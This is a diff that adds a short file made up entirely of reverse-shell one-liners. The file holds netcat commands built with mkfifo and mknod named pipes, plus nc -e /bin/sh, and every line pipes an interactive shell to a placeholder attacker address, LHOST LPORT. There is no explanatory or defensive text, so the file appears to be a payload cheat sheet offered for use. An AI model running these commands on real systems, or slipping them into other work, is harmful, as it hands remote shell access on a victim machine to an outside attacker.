@@ -1,0 +1,8 @@
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f
+---------------------------------------------------------------------------------------------------
+nc -e /bin/sh LHOST LPORT
+/bin/sh | nc LHOST LPORT
+---------------------------------------------------------------------------------------------------
+rm -f backpipe; mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc LHOST LPORT 1>/tmp/backpipe
+---------------------------------------------------------------------------------------------------
+rm -f backpipe; mknod /tmp/backpipe p && nc LHOST LPORT 0<backpipe | /bin/bash 1>backpipe
